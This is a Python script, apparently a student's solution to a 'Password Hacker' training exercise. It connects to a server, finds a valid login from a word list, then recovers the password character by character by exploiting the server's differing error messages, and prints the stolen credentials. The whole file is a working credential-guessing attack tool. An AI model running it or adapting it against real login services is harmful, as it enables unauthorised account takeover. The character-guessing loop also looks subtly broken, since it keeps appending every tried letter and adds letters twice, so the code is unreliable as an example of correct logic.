import socket
import sys
import itertools
import json


class PasswordHacker:

	def __init__(self):
		self.args = sys.argv
		self.host = self.args[1]
		self.port = int(self.args[2])
		self.login_path = '/home/liudaska/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt'
		self.socket_connection()

	def file_opening(self, path):
		with open(path, 'r', encoding='utf-8') as file:
			return [line.strip() for line in file.readlines()]

	def password_generator(self, i):
		alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
		for password in itertools.product(alphabet, repeat=i):
			yield ''.join(password)


	def login_generator(self):
		lines = self.file_opening(self.login_path)
		for login in lines:
			yield login.strip()

	def test_credentials(self,client_socket, login, password):
		credentials = {"login": login, "password": password}
		client_socket.send(json.dumps(credentials).encode())
		response = client_socket.recv(1024)
		return json.loads(response.decode())

	def socket_connection(self):

		with socket.socket() as client_socket:
			address = (self.host, self.port)
			client_socket.connect(address)
			logins = self.login_generator()
			adminlogin = ''

			for login in logins:
				password = ' '
				response = self.test_credentials(client_socket, login, password)
				if response['result'] == "Wrong login!":
					continue
				elif response['result'] == "Wrong password!":
					adminlogin = login
					break

			success = False
			password = ''
			while not success:
				for letter in self.password_generator(1):
					password += letter
					response = self.test_credentials(client_socket, adminlogin, password)

					if response['result'] == "Exception happened during login":
						password += letter
						break
					elif response['result'] == "Connection success!":
						adminpass = password + letter
						success = True
						break

			credentials = {"login": adminlogin, "password": adminpass}
			print(json.dumps(credentials))

hack_password = PasswordHacker()
